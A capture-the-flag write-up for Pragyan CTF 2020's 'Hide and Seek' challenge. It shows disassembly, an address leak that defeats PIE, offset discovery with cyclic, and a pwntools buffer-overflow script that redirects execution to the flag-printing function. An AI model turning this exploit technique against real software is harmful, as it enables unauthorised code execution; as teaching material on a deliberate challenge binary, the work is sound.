# Pragyan CTF 2020: Hide and Seek.


> Find and submit the flag
>
> [./includes/gps](gps)

## Write-up
Given the binary,

1. If we try to run the binary as `./gps`, then enter random input, we get the output as

```bash
$ ./gps

---   ---   ---   ---
|5|   |5|   |6|   |4|
---   ---   ---   ---

     YOU ARE HERE      
          O            
---   ---   ---   ---
|6|   |5|   |3|   |c|
---   ---   ---   ---
hello
Search Not Found.
```
2. If we try to run the binary again, we see that the characters in the boxes have changed seemingly randomly, like so

```bash
$ ./gps

---   ---   ---   ---
|5|   |5|   |c|   |4|
---   ---   ---   ---

     YOU ARE HERE      
          O            
---   ---   ---   ---
|6|   |a|   |3|   |c|
---   ---   ---   ---
```
3. If we disassemble the binary with `objdump -D gps`, we get the disassembly of the main function as

```bash
$ objdump -D gps

000014aa <main>:
    14aa:       f3 0f 1e fb             endbr32 
    14ae:       8d 4c 24 04             lea    0x4(%esp),%ecx
    14b2:       83 e4 f0                and    $0xfffffff0,%esp
    14b5:       ff 71 fc                pushl  -0x4(%ecx)
    14b8:       55                      push   %ebp
    14b9:       89 e5                   mov    %esp,%ebp
    14bb:       53                      push   %ebx
    14bc:       51                      push   %ecx
    14bd:       e8 0e fd ff ff          call   11d0 <__x86.get_pc_thunk.bx>
    14c2:       81 c3 f6 2a 00 00       add    $0x2af6,%ebx
    14c8:       e8 7f fe ff ff          call   134c <gps>
    14cd:       83 ec 0c                sub    $0xc,%esp
    14d0:       8d 83 ec e0 ff ff       lea    -0x1f14(%ebx),%eax
    14d6:       50                      push   %eax
    14d7:       e8 54 fc ff ff          call   1130 <puts@plt>
    14dc:       83 c4 10                add    $0x10,%esp
    14df:       b8 00 00 00 00          mov    $0x0,%eax
    14e4:       8d 65 f8                lea    -0x8(%ebp),%esp
    14e7:       59                      pop    %ecx
    14e8:       5b                      pop    %ebx
    14e9:       5d                      pop    %ebp
    14ea:       8d 61 fc                lea    -0x4(%ecx),%esp
    14ed:       c3                      ret    
    14ee:       66 90                   xchg   %ax,%ax
```
where we can see that it calls some function called gps. Looking at the disassembly of the gps function, it is very long. There is also another function called found whose disassembly is

```bash
000012cd <found>:
    12cd:       f3 0f 1e fb             endbr32 
    12d1:       55                      push   %ebp
    12d2:       89 e5                   mov    %esp,%ebp
    12d4:       53                      push   %ebx
    12d5:       83 ec 34                sub    $0x34,%esp
    12d8:       e8 f3 fe ff ff          call   11d0 <__x86.get_pc_thunk.bx>
    12dd:       81 c3 db 2c 00 00       add    $0x2cdb,%ebx
    12e3:       83 ec 0c                sub    $0xc,%esp
    12e6:       8d 83 50 e0 ff ff       lea    -0x1fb0(%ebx),%eax
    12ec:       50                      push   %eax
    12ed:       e8 3e fe ff ff          call   1130 <puts@plt>
    12f2:       83 c4 10                add    $0x10,%esp
    12f5:       83 ec 08                sub    $0x8,%esp
    12f8:       8d 83 63 e0 ff ff       lea    -0x1f9d(%ebx),%eax
    12fe:       50                      push   %eax
    12ff:       8d 83 65 e0 ff ff       lea    -0x1f9b(%ebx),%eax
    1305:       50                      push   %eax
    1306:       e8 55 fe ff ff          call   1160 <fopen@plt>
    130b:       83 c4 10                add    $0x10,%esp
    130e:       89 45 f4                mov    %eax,-0xc(%ebp)
    1311:       83 ec 04                sub    $0x4,%esp
    1314:       ff 75 f4                pushl  -0xc(%ebp)
    1317:       6a 28                   push   $0x28
    1319:       8d 45 cc                lea    -0x34(%ebp),%eax
    131c:       50                      push   %eax
    131d:       e8 de fd ff ff          call   1100 <fgets@plt>
    1322:       83 c4 10                add    $0x10,%esp
    1325:       83 ec 0c                sub    $0xc,%esp
    1328:       ff 75 f4                pushl  -0xc(%ebp)
    132b:       e8 e0 fd ff ff          call   1110 <fclose@plt>
    1330:       83 c4 10                add    $0x10,%esp
    1333:       83 ec 0c                sub    $0xc,%esp
    1336:       8d 45 cc                lea    -0x34(%ebp),%eax
    1339:       50                      push   %eax
    133a:       e8 f1 fd ff ff          call   1130 <puts@plt>
    133f:       83 c4 10                add    $0x10,%esp
    1342:       83 ec 0c                sub    $0xc,%esp
    1345:       6a 00                   push   $0x0
    1347:       e8 f4 fd ff ff          call   1140 <exit@plt>
```
We can see that it opens a file and calls puts to print something, and then exits. Hence, it must be the function that outputs the flag.

3. Also, there are 8 characters in the boxes in the output shown by the binary, which may be part of a 4-bit hexadecimal address.

4. To find out some basic information about the binary, we run `file gps`, which gives the output

```bash
$ file gps
gps: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=256d635872fc63b8aba766ddc3a2d7892a038c7d, for GNU/Linux 3.2.0, not stripped
```
from which we can see that it is a 32-bit ELF executable that has PIE enabled and is not stripped. Hence, we can infer that the 8 characters that we see outputed by the binary change for every execution, because they are the effective memory address for some object in the executable.

5. Since the binary output says 'You are here', it might mean that the memory address that the characters are the address of the present location in the binary. From the disassembly of the main and gps functions, we can see that the printf and scanf functions that we encounter when the binary is executed is found in this section of function gps

```bash
    146b:       8d 83 87 e0 ff ff       lea    -0x1f79(%ebx),%eax
    1471:       50                      push   %eax
    1472:       e8 79 fc ff ff          call   10f0 <printf@plt>
    1477:       83 c4 20                add    $0x20,%esp
    147a:       83 ec 0c                sub    $0xc,%esp
    147d:       8d 83 71 e0 ff ff       lea    -0x1f8f(%ebx),%eax
    1483:       50                      push   %eax
    1484:       e8 a7 fc ff ff          call   1130 <puts@plt>
    1489:       83 c4 10                add    $0x10,%esp
    148c:       83 ec 08                sub    $0x8,%esp
    148f:       8d 45 e2                lea    -0x1e(%ebp),%eax
    1492:       50                      push   %eax
    1493:       8d 83 e9 e0 ff ff       lea    -0x1f17(%ebx),%eax
    1499:       50                      push   %eax
    149a:       e8 e1 fc ff ff          call   1180 <__isoc99_scanf@plt>
    149f:       83 c4 10                add    $0x10,%esp
    14a2:       90                      nop
    14a3:       8d 65 f8                lea    -0x8(%ebp),%esp
    14a6:       5b                      pop    %ebx
    14a7:       5e                      pop    %esi
    14a8:       5d                      pop    %ebp
    14a9:       c3                      ret    
```
Hence we can say that the 8 characters describe memory location of the function gps.

6. Reading the characters such that each byte is formed by one character in the top row and the corresponding character in the bottom row, we get the byte sequence `0x56 0x5a 0xc3 0x4c`. However, as the address changes for each execution, we cannot use the direct value in our exploit, but must construct it from the output for each execution.

7. In order to get the found function to execute, we can construct a buffer overflow to change the return address of the gps function to point to the location of the found function. To find out the offset required, we use the command line tools provided through pwntools

```bash
$ cyclic 50
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
```
Using this string as input to the binary,

```bash
$ ./gps
---   ---   ---   ---
|5|   |6|   |a|   |4|
---   ---   ---   ---

     YOU ARE HERE      
          O            
---   ---   ---   ---
|6|   |1|   |3|   |c|
---   ---   ---   ---
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
Segmentation fault (core dumped)
```
Analysing the segmentation fault,

```bash
$ dmesg | tail
[  794.070613] gps[4833]: segfault at 616a6161 ip 00000000616a6161 sp 00000000ff85f1c0 error 14 in libc-2.30.so[f7dbe000+1d000]
[  794.070629] Code: Bad RIP value.
```
which shows that it occured at the address 616a6161. Using this as the lookup value,

```bash
$ cyclic -l 0x616a6161
34
```
Hence we obtain the offset as 34.

8. To find the difference between the addresses of the functions gps and found, running `readelf -s gps` and looking at part of the output,

```bash
$ readelf -s gps
    56: 0000134c   350 FUNC    GLOBAL DEFAULT   16 gps
    57: 000012c9     0 FUNC    GLOBAL HIDDEN    16 __x86.get_pc_thunk.dx
    58: 00000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@@GLIBC_2.1
    59: 00000000     0 FUNC    GLOBAL DEFAULT  UND malloc@@GLIBC_2.0
    60: 00004000     0 NOTYPE  GLOBAL DEFAULT   25 __data_start
    61: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.0
    62: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    63: 00000000     0 FUNC    GLOBAL DEFAULT  UND exit@@GLIBC_2.0
    64: 00004004     0 OBJECT  GLOBAL HIDDEN    25 __dso_handle
    65: 000012cd   127 FUNC    GLOBAL DEFAULT   16 found
    66: 00002004     4 OBJECT  GLOBAL DEFAULT   18 _IO_stdin_used
    67: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    68: 000014f0   101 FUNC    GLOBAL DEFAULT   16 __libc_csu_init
    69: 00000000     0 FUNC    GLOBAL DEFAULT  UND fopen@@GLIBC_2.1
    70: 0000400c     0 NOTYPE  GLOBAL DEFAULT   26 _end
    71: 00001190    58 FUNC    GLOBAL DEFAULT   16 _start
    72: 00002000     4 OBJECT  GLOBAL DEFAULT   18 _fp_hw
    73: 00004008     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start
    74: 000014aa    68 FUNC    GLOBAL DEFAULT   16 main
    75: 00000000     0 FUNC    GLOBAL DEFAULT  UND sprintf@@GLIBC_2.0
    76: 00000000     0 FUNC    GLOBAL DEFAULT  UND __isoc99_scanf@@GLIBC_2.7
    77: 00004008     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__
    78: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable
```
We can see that gps is located at the address `(some starting point) + 134c` and found is located at the address `(some starting point) + 12cd`. Hence, we can say that the difference between the two locations is `address(gps)- address(found) = 127`

9. Now constructing the exploit using pwntools, as `exploit.py`,
```python
#!/usr/bin/env python

from pwn import *

elf = ELF('./gps')
p = elf.process()

#Receive the binary's output and split the lines and characters
data = p.recv()
data1 = data.decode().split('\n')[1].split('|')
data2 = data.decode().split('\n')[7].split('|')

#Construct the address by putting the characters together in the correct order
gpsaddr = data1[1]+data2[1]+data1[3]+data2[3]+data1[5]+data2[5]+data1[7]+data2[7]
gpsaddr = int(gpsaddr,16)

#Calculate address of the function found
foundaddr = gpsaddr-127

#Build the payload
payload = b'a'*34+p32(foundaddr)

p.sendline(payload)
p.interactive()
```

10. Running the exploit on the remote link provided,
```bash
You found My Toy!
p_ctf{I_g0t_th3_b35t_t07_1n_th3_w02ld!}
```
which provides us with the flag.